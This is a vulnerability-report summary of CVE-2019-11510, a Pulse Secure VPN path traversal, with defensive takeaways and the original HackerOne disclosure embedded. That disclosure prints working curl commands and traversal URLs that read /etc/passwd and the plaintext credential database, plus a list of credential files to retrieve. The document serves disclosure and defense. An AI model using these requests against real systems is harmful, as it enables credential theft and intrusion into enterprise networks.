# Pulse Secure Path Traversal Leading to Credential Disclosure and Post-Authentication RCE

## Metadata
- **Source:** HackerOne
- **Report:** 671749 | https://hackerone.com/reports/671749
- **Submitted:** 2019-08-12
- **Reporter:** alyssa_herrera
- **Program:** Pulse Secure
- **Bounty:** Not specified
- **Severity:** critical
- **Vuln:** Path Traversal, Directory Traversal, Cleartext Password Storage, Information Disclosure, Post-Authentication Remote Code Execution
- **CVEs:** CVE-2019-11510
- **Category:** memory-binary

## Summary
CVE-2019-11510 is a path traversal vulnerability in Pulse Secure that allows unauthenticated attackers to bypass normalization checks and access arbitrary files on the system. The vulnerability enables disclosure of sensitive files including /data/runtime/mtmp/lmdb/dataa/data.mdb which contains plaintext credentials, allowing subsequent lateral movement and post-authentication RCE exploitation.

## Attack scenario
1. Attacker discovers Pulse Secure VPN instance and identifies vulnerable endpoint /dana-na/ path
2. Attacker crafts malicious URL using path traversal sequences (../) combined with query parameter manipulation to bypass normalization filters
3. Attacker accesses /etc/passwd to confirm file disclosure capability and identify system structure
4. Attacker retrieves /data/runtime/mtmp/lmdb/dataa/data.mdb containing plaintext username and password combinations
5. Attacker uses disclosed credentials to authenticate to Pulse Secure instance
6. Attacker leverages post-authentication RCE exploit to achieve full system compromise

## Root cause
Improper path normalization in the request handler for /dana-na/ endpoint allows attacker-controlled path traversal sequences to reach parent directories despite intended access controls. Query parameters and fragment identifiers are used to bypass secondary validation checks.

## Attacker mindset
Opportunistic VPN targeting - Pulse Secure instances are high-value targets due to their role in enterprise access. The combination of unauthenticated file disclosure with plaintext credential storage represents a complete authentication bypass chain requiring minimal sophistication to exploit.

## Defensive takeaways
- Implement strict input validation and canonicalization before path resolution - resolve all path components to absolute paths and compare against whitelist
- Never store authentication credentials in plaintext; use salted hashing with strong algorithms
- Apply principle of least privilege to file system permissions for sensitive credential storage
- Implement defense-in-depth: validate at multiple layers including web server and application
- Use URL parsing libraries that handle edge cases correctly; avoid custom parsing logic
- Implement rate limiting and monitoring for suspicious traversal attempts (consecutive ../ sequences)
- Regularly audit and harden VPN appliance configurations; these are critical infrastructure
- Apply security patches immediately for VPN/access control systems given their privileged role

## Variant hunting
Search for similar path traversal patterns in other Pulse Secure endpoints (/dana/, /admin/, /manage/); test for alternative encoding schemes (double-encoding, unicode normalization); check for similar vulnerable normalization in other F5 products (BIG-IP); investigate whether query parameters or fragments bypass validation in other endpoints; test for LDAP injection or other authentication bypass mechanisms in credential validation

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1083 - File and Directory Discovery
- T1552.001 - Credentials in Files
- T1078.001 - Valid Accounts
- T1059 - Command and Scripting Interpreter

## Notes
This vulnerability chain demonstrates the critical importance of layered security. The initial path traversal has limited standalone impact but becomes devastating when combined with insecure credential storage. The researcher responsibly stopped before testing post-auth RCE but indicated such exploitation was feasible. CVE-2019-11510 became widely exploited in the wild and was leveraged in multiple APT campaigns. The vulnerability highlights why VPN appliances must receive immediate patching priority.

## Full report
<details><summary>Expand</summary>

**Summary:**
Pulse Secure has two main vulnerabilities that allow file disclosure and post auth RCE
**Description:**
CVE-2019-11510  is a file disclosure due to some normalization issues in pulse secure. I was able to reproduce this by  grabbing in the etc/passswd. 
https://$hax/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#

Though the impact of that is very limited, medium to high sec at best. From here we can grab a specific file.

The file /data/runtime/mtmp/lmdb/dataa/data.mdb contains clear context passwords and usernames, when a user logs in from here we can then access the Pulse secure instance. I stopped here due to not wanting to break the rules of engagements but from here I would log in then exploit a Post auth exploit.


Here's a list of files that an attacker would instantly hit
/data/runtime/mtmp/system
/data/runtime/mtmp/lmdb/dataa/data.mdb
/data/runtime/mtmp/lmdb/dataa/lock.mdb
/data/runtime/mtmp/lmdb/randomVal/data.mdb
/data/runtime/mtmp/lmdb/randomVal/lock.mdb
## Impact
Critical 
## Step-by-step Reproduction Instructions
We can only do this  using due to browsers messing up the exploit

curl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://███/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#

## Product, Version, and Configuration (If applicable)
Pulse Secure
## Suggested Mitigation/Remediation Actions
Patch pulse immediately

## Impact

An attacker will be able to download internal files and specifically target a local file which stores clear text passwords when a user login. This also an attacker to access highly sensitive internal areas and even can perform command execution

</details>

---
*Analysed by Claude on 2026-05-12*
